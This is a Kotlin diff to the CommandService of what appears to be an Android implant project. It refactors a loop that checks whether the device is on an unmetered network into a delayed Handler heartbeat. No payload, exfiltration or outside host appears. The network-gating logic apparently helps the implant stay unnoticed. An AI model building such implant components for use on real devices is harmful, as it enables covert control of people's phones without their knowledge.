@@ -3,7 +3,10 @@ package com.cooperthecoder.implant.command
 import android.app.Service
 import android.content.Context
 import android.content.Intent
-import android.os.*
+import android.os.Build
+import android.os.Handler
+import android.os.HandlerThread
+import android.os.IBinder
 import android.util.Log
 import com.cooperthecoder.implant.App
 import com.cooperthecoder.implant.Config
@@ -37,14 +40,17 @@ class CommandService : Service() {
         this@CommandService.onMeteredConnection()
     }
 
-    val checkMeteredTask = Runnable {
-        do {
-            // Avoid using up 100% CPU
-            Thread.sleep(HEARTBEAT_INTERVAL)
-            Log.d(TAG, "Checking if network is still unmetered.")
-        } while (Networking.isUnmeteredNetwork(this))
-        Log.d(TAG, "Metered network detected.")
-        mainHandler.post(meteredNetworkTask)
+    val checkMeteredTask: Runnable = object : Runnable {
+        override fun run() {
+            if (!Networking.isUnmeteredNetwork(this@CommandService)) {
+                Log.d(TAG, "Metered network detected.")
+                mainHandler.post(meteredNetworkTask)
+
+            }
+
+            Log.d(TAG, "Network still unmetered, checking again in $HEARTBEAT_INTERVAL ms")
+            this@CommandService.heartbeat()
+        }
     }
 
     override fun onBind(intent: Intent): IBinder? {
@@ -76,8 +82,12 @@ class CommandService : Service() {
         connectivityThread.start()
         connectionHandler = Handler(connectivityThread.looper)
         mainHandler = Handler(mainLooper)
-        connectionHandler.post(checkMeteredTask)
+        heartbeat()
 
+    }
+
+    private fun heartbeat() {
+        connectionHandler.postDelayed(checkMeteredTask, HEARTBEAT_INTERVAL)
     }
 
 
